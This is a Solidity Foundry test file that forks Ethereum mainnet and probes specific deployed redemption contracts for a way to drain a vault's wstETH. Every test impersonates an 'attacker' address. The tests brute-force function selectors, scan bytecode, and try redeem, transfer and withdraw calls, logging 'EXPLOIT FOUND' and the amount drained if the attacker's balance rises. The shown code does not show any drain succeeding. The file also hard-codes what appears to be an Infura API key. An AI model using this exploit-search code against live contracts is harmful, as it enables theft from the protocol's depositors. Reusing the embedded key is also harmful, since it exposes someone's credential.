// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract DirectRCRedeemCall is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CallRCRedeemSelectorOnRedemption1() public {
        console.log("=== CALLING RC.REDEEM SELECTOR ON REDEMPTION_1 ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // RC.redeem(uint256,address) selector = 0x7bde82f2
        bytes memory calldata1 = abi.encodeWithSelector(
            bytes4(0x7bde82f2),
            1000e18,
            attacker
        );

        vm.startPrank(attacker);

        console.log("\nCalling 0x7bde82f2 (RC.redeem) on REDEMPTION_1:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(calldata1);
        console.log("Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error selector:");
            console.logBytes4(bytes4(d1));
        }
        if (d1.length > 4) {
            console.log("Return data length:", d1.length);
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** DIRECT EXPLOIT FOUND! ***");
            console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        }
    }

    function test_TryDifferentSelectorsWithRedeemParams() public {
        console.log("=== TRYING DIFFERENT SELECTORS WITH REDEEM PARAMS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // These selectors appear in REDEMPTION_1 and might route to RC.redeem
        bytes4[] memory sels = new bytes4[](15);
        sels[0] = bytes4(0xb2118a8d);  // claimRewards?
        sels[1] = bytes4(0x778d364f);
        sels[2] = bytes4(0x51cbf345);
        sels[3] = bytes4(0x42dbe168);
        sels[4] = bytes4(0x458f5815);
        sels[5] = bytes4(0x2ab60045);
        sels[6] = bytes4(0x38a63183);
        sels[7] = bytes4(0x04824e70);
        sels[8] = bytes4(0x06e29712);
        sels[9] = bytes4(0x1650cf97);
        sels[10] = bytes4(0x36600461);
        sels[11] = bytes4(0xa29faff0);
        sels[12] = bytes4(0xba087652);
        sels[13] = bytes4(0x4cdad506);  // previewRedeem?
        sels[14] = bytes4(0x07a2d13a);  // convertToAssets?

        vm.startPrank(attacker);

        for (uint i = 0; i < sels.length; i++) {
            // Try with (amount, recipient) params
            (bool s, bytes memory d) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], 1000e18, attacker)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
                if (d.length >= 32) {
                    console.log("  Return value:", abi.decode(d, (uint256)));
                }
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    function test_InvestigateFunctionsThatCallRC() public {
        console.log("=== INVESTIGATING FUNCTIONS THAT MIGHT CALL RC ===\n");

        // The RC.redeem selector appears at offsets 3627 and 3861
        // Let's find which function selectors are nearby

        bytes memory code = REDEMPTION_1.code;

        // Look at code around offset 3627
        console.log("Code around offset 3627:");
        for (uint i = 3600; i < 3700 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
        }

        // Look at code around offset 3861
        console.log("\nCode around offset 3861:");
        for (uint i = 3850; i < 3950 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x63) {
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                console.log(i, "PUSH4:");
                console.logBytes4(sel);
            }
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
        }
    }

    function test_TryFinalizeRelatedFunctions() public {
        console.log("=== TRYING FINALIZE RELATED FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Selectors that might be related to finalization
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(keccak256("finalize(uint256)"));
        sels[1] = bytes4(keccak256("finalize(uint256,address)"));
        sels[2] = bytes4(keccak256("finalizeWithdraw(uint256)"));
        sels[3] = bytes4(keccak256("completeRedeem(uint256)"));
        sels[4] = bytes4(keccak256("processRedeem(uint256)"));
        sels[5] = bytes4(keccak256("executeRedeem(uint256)"));
        sels[6] = bytes4(keccak256("claimRedeem(uint256)"));
        sels[7] = bytes4(keccak256("settleRedeem(uint256)"));
        sels[8] = bytes4(0x578063ed); // from earlier scan
        sels[9] = bytes4(0xcff50c6e); // from earlier scan

        console.log("Selectors:");
        for (uint i = 0; i < sels.length; i++) {
            console.logBytes4(sels[i]);
        }

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("\nTrying selectors:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            if (s) {
                console.log("SUCCESS:", i);
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_CheckRedemption1VaultInteraction() public view {
        console.log("=== CHECKING REDEMPTION_1 VAULT INTERACTION ===\n");

        // 0x411557d1 returns VAULT address
        // What other functions return important addresses?

        console.log("Checking address-returning functions:");

        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x411557d1))
        );
        if (s1 && d1.length >= 32) {
            console.log("0x411557d1 (vault?):", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (s2 && d2.length >= 32) {
            console.log("asset():", abi.decode(d2, (address)));
        }

        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("token()")
        );
        if (s3 && d3.length >= 32) {
            console.log("token():", abi.decode(d3, (address)));
        }

        (bool s4, bytes memory d4) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("redemptionController()")
        );
        if (s4 && d4.length >= 32) {
            console.log("redemptionController():", abi.decode(d4, (address)));
        }

        (bool s5, bytes memory d5) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x61d027b3)) // treasury
        );
        if (s5 && d5.length >= 32) {
            console.log("0x61d027b3 (treasury?):", abi.decode(d5, (address)));
        }
    }

    function test_TryAllKnownSelectorsWithVariousParams() public {
        console.log("=== TRYING ALL KNOWN SELECTORS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        bytes4[] memory sels = new bytes4[](40);
        sels[0] = bytes4(0x715018a6);
        sels[1] = bytes4(0xc5d664c6);
        sels[2] = bytes4(0xeda72134);
        sels[3] = bytes4(0x578063ed);
        sels[4] = bytes4(0xf2fde38b);
        sels[5] = bytes4(0xfd424ea8);
        sels[6] = bytes4(0xcff50c6e);
        sels[7] = bytes4(0xe30c3978);
        sels[8] = bytes4(0x8da5cb5b);
        sels[9] = bytes4(0x9307e802);
        sels[10] = bytes4(0xb2118a8d);
        sels[11] = bytes4(0x778d364f);
        sels[12] = bytes4(0x79ba5097);
        sels[13] = bytes4(0x411557d1);
        sels[14] = bytes4(0x51cbf345);
        sels[15] = bytes4(0x5c975abb);
        sels[16] = bytes4(0x61d027b3);
        sels[17] = bytes4(0x42dbe168);
        sels[18] = bytes4(0x458f5815);
        sels[19] = bytes4(0x252c50f3);
        sels[20] = bytes4(0x2ab60045);
        sels[21] = bytes4(0x38a63183);
        sels[22] = bytes4(0x04824e70);
        sels[23] = bytes4(0x06e29712);
        sels[24] = bytes4(0x1650cf97);
        sels[25] = bytes4(0x36600461);
        sels[26] = bytes4(0xa29faff0);
        sels[27] = bytes4(0x70a08231);
        sels[28] = bytes4(0x07a2d13a);
        sels[29] = bytes4(0x3f14c193);
        sels[30] = bytes4(0x57604051);
        sels[31] = bytes4(0xddca3f43);
        sels[32] = bytes4(0x4cdad506);
        sels[33] = bytes4(0xba087652);
        sels[34] = bytes4(0x781b7e08);
        sels[35] = bytes4(0x42966c68);
        sels[36] = bytes4(0x7bde82f2); // RC.redeem
        sels[37] = bytes4(0x23b872dd);
        sels[38] = bytes4(0xa9059cbb);
        sels[39] = bytes4(0x43000818);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("Testing with (uint256, address) params:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );
            if (s) {
                uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
                if (attackerBal > 0) {
                    console.log("*** EXPLOIT FOUND with selector:");
                    console.logBytes4(sels[i]);
                    console.log("Attacker balance:", attackerBal / 1e18);
                    break;
                }
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nFinal results:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    function test_DirectDrainAttempt() public {
        console.log("=== DIRECT DRAIN ATTEMPT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBefore / 1e18, "wstETH");
        console.log("Value: ~$", (vaultBefore * 2300) / 1e18);

        // The key is: REDEMPTION_1 can call RC.redeem
        // Can we make REDEMPTION_1 execute that call with our parameters?

        // Approach 1: Call RC.redeem selector directly
        console.log("\n1. Trying direct 0x7bde82f2 call:");
        vm.startPrank(attacker);
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x7bde82f2), 100e18, attacker)
        );
        console.log("   Result:", s1);
        console.log("   Attacker bal:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();

        // Approach 2: Try transfer-like functions
        console.log("\n2. Trying transfer functions:");
        vm.startPrank(attacker);
        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 100e18)
        );
        console.log("   transfer:", s2);
        console.log("   Attacker bal:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();

        // Approach 3: Try withdraw with our address
        console.log("\n3. Trying withdraw:");
        vm.startPrank(attacker);
        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("   withdraw:", s3);
        console.log("   Attacker bal:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
    }
}
